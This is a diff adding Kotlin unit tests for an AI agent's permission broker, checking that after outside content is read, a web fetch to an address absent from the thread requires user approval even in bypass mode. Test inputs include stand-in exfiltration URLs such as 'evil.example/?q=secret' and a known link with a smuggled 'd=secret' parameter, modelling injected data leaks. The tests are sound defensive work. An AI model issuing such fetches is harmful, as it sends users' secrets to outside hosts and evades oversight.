@@ -363,4 +363,111 @@ class PermissionBrokerTest {
 
         assertFalse(broker.mayRun(sharer, ToolCall("1", "share_file", "not json")))
     }
+
+    // The address rule: after outside content, a call to an address that appeared nowhere in the thread asks.
+    private val fetcher = FakeTool("web_fetch", addressArgument = "url")
+    private val addressesInThread = "Search result: https://news.example/story?id=1"
+
+    private fun brokerAfterOutsideContent(
+        approver: FixedApprover,
+        mode: ApprovalMode = ApprovalMode.ASK,
+        state: ThreadApprovalState = ThreadApprovalState(),
+        readOutside: Boolean = true,
+    ): PermissionBroker {
+        val broker = PermissionBroker(
+            approver,
+            state,
+            approvalMode = { mode },
+            knownAddresses = { address -> WebAddresses.appearsIn(address, addressesInThread) },
+        )
+        if (readOutside) {
+            runBlocking { broker.outsideContentWasRead() }
+        }
+        return broker
+    }
+
+    @Test
+    fun aKnownAddressRunsWithoutACardAfterOutsideContent() = runBlocking {
+        val approver = FixedApprover(ApprovalDecision.DENY)
+        val broker = brokerAfterOutsideContent(approver)
+
+        assertTrue(broker.mayRun(fetcher, call("1", "web_fetch", "url" to "https://news.example/story?id=1")))
+        assertTrue(approver.requests.isEmpty())
+    }
+
+    @Test
+    fun anUnknownAddressAsksAfterOutsideContentEvenInBypass() = runBlocking {
+        val approver = FixedApprover(ApprovalDecision.DENY)
+        val broker = brokerAfterOutsideContent(approver, mode = ApprovalMode.BYPASS)
+
+        assertFalse(broker.mayRun(fetcher, call("1", "web_fetch", "url" to "https://evil.example/?q=secret")))
+
+        val request = approver.requests.single()
+        assertTrue(request.afterOutsideContent)
+        assertFalse(request.offersThreadAllowance)
+    }
+
+    @Test
+    fun anUnknownAddressAsksDespiteTheThreadAllowance() = runBlocking {
+        val approver = FixedApprover(ApprovalDecision.DENY)
+        val broker = brokerAfterOutsideContent(approver, state = ThreadApprovalState(allowAllInThread = true))
+
+        assertFalse(broker.mayRun(fetcher, call("1", "web_fetch", "url" to "https://evil.example/?q=secret")))
+        assertEquals(1, approver.requests.size)
+    }
+
+    @Test
+    fun anUnknownAddressRunsBeforeAnyOutsideContentWasRead() = runBlocking {
+        val approver = FixedApprover(ApprovalDecision.DENY)
+        val broker = brokerAfterOutsideContent(approver, readOutside = false)
+
+        assertTrue(broker.mayRun(fetcher, call("1", "web_fetch", "url" to "https://anything.example/x")))
+        assertTrue(approver.requests.isEmpty())
+    }
+
+    @Test
+    fun anAddressThatOnlyDiffersInItsQueryAsksAfterOutsideContent() = runBlocking {
+        val approver = FixedApprover(ApprovalDecision.DENY)
+        val broker = brokerAfterOutsideContent(approver)
+
+        assertFalse(broker.mayRun(fetcher, call("1", "web_fetch", "url" to "https://news.example/story?id=1&d=secret")))
+        assertEquals(1, approver.requests.size)
+    }
+
+    @Test
+    fun withTheOutsideContentRuleSwitchedOffAnUnknownAddressRuns() = runBlocking {
+        val approver = FixedApprover(ApprovalDecision.DENY)
+        val broker = PermissionBroker(approver, asksAfterOutsideContent = { false })
+        broker.outsideContentWasRead()
+
+        assertTrue(broker.mayRun(fetcher, call("1", "web_fetch", "url" to "https://evil.example/?q=secret")))
+    }
+
+    @Test
+    fun theAddressIsNotLookedUpBeforeOutsideContentWasRead() = runBlocking {
+        var lookups = 0
+        val broker = PermissionBroker(
+            FixedApprover(ApprovalDecision.DENY),
+            knownAddresses = {
+                lookups += 1
+                true
+            },
+        )
+
+        broker.mayRun(fetcher, call("1", "web_fetch", "url" to "https://x.example/"))
+        assertEquals(0, lookups)
+    }
+
+    @Test
+    fun aFetchAfterOutsideContentIsScheduledAloneAndBeforeItAlongsideOthers() = runBlocking {
+        val broker = PermissionBroker(FixedApprover(ApprovalDecision.DENY))
+        val fetch = call("1", "web_fetch", "url" to "https://x.example/")
+
+        assertFalse(broker.mayAskAboutAddress(fetcher, fetch))
+        broker.outsideContentWasRead()
+        assertTrue(broker.mayAskAboutAddress(fetcher, fetch))
+        assertFalse(broker.mayAskAboutAddress(reader, call("2", "read_file")))
+        assertFalse(ToolCallScheduler.readsOnly(fetcher, fetch, mayAskAboutAddress = true))
+        assertTrue(ToolCallScheduler.readsOnly(fetcher, fetch))
+    }
 }
